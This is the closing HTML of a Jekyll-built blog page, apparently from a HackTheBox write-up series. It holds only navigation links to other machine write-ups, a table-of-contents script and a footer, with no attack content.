<a class="previous" href="/hackthebox/2020/07/06/Tabby.html" title="HackTheBox Tabby">HackTheBox Tabby</a><a class="next" href="/hackthebox/2020/07/11/Blackfield.html" title="Hackthebox Blackfiled">Hackthebox Blackfiled</a>
</div>
<div class="post-related">
      <div>Related Articles</div>
      <ul>
        <li><a class="post-link" href="/hackthebox/retired/2020/03/13/Bashed.html" title="Hackthebox Blackfiled">HackTheBox Bashed</a></li>
<li><a class="post-link" href="/hackthebox/2021/03/29/Armageddon.html" title="Hackthebox Blackfiled">HackTheBox Armageddon"</a></li>
<li><a class="post-link" href="/hackthebox/retired/2020/06/12/Monteverde.html" title="Hackthebox Blackfiled">HackTheBox Monteverde</a></li>
<li><a class="post-link" href="/hackthebox/2020/07/06/Tabby.html" title="Hackthebox Blackfiled">HackTheBox Tabby</a></li>
</ul>
    </div>
<div class="post-comments"></div></section>
</div>


  </section>
  <section class="sidebar" style="margin-left: 15px;">
    <!-- Get sidebar items --><style type="text/css" media="screen">
.post-menu ul {
  list-style: none;
  padding: 0;
  margin: 0;
}
</style>

<div class="post-menu">
  <div class="post-menu-title"> Contents</div>
  <div class="post-menu-content"></div>
</div>

<script>
  function generateContent() {
    var menu = document.querySelector(".post-menu");
    var menuContent =  menu.querySelector(".post-menu-content");
    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");

    // Hide menu when no headings
    if (headings.length === 0) {
      return menu.style.display = "none";
    }

    // Generate post menu
    var menuHTML = '';
    for (var i = 0; i < headings.length; i++) {
      var h = headings[i];
      menuHTML += (
        '<li class="h-' + h.tagName.toLowerCase() + '">'
        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
    }

    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';

    // The header element
    var header = document.querySelector('header.site-header');

    function doMenuCollapse(index, over_items) {
      var items = menuContent.firstChild.children;

      if (over_items == undefined) {
        over_items = 20;
      }

      if (items.length < over_items) {
        return;
      }

      var activeItem = items[index];
      var beginItem = activeItem
      var endItem = activeItem
      var beginIndex = index;
      var endIndex = index + 1;
      while (beginIndex >= 0
        && !items[beginIndex].classList.contains('h-h2')) {
        beginIndex -= 1;
      }
      while (endIndex < items.length
        && !items[endIndex].classList.contains('h-h2')) {
        endIndex += 1;
      }
      for (var i = 0; i < beginIndex; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
      for (var i = beginIndex + 1; i < endIndex; i++) {
        item = items[i]
        // if (!item.classList.contains('h-h2')) {
          item.style.display = '';
        // }
      }
      for (var i = endIndex; i < items.length; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
    }

    // Init menu collapsed
    doMenuCollapse(-1);

    // Active the menu item
    window.addEventListener('scroll', function (event) {
      var lastActive = menuContent.querySelector('.active');
      var changed = true;
      var activeIndex = -1;
      for (var i = headings.length - 1; i >= 0; i--) {
        var h = headings[i];
        var headingRect = h.getBoundingClientRect();
        var headerRect = header.getBoundingClientRect();
        var headerTop = Math.floor(headerRect.top);
        var headerHeight = Math.floor(headerRect.height);
        var headerHeight = headerTop + headerHeight + 20;
        if (headingRect.top <= headerHeight) {
          var id = 'h-' + h.getAttribute('id');
          var a = menuContent.querySelector('a[href="#' + id  + '"]');
          var curActive = a.parentNode;
          if (curActive) {
            curActive.classList.add('active');
            activeIndex = i;
          }
          if (lastActive == curActive) {
            changed = false;
          }
          break;
        }
      }
      if (changed) {
        if (lastActive) {
          lastActive.classList.remove('active');
        }
        doMenuCollapse(activeIndex);
      }
      event.preventDefault();
    });
  }
  generateContent();
</script>
</section>
</div>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">
    <div class="site-footer-inner">
      <div>Copyright © 2020-2022 @Jeevan</div>
      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
      
    </div>
  </div>
</footer>
</body>
</html>
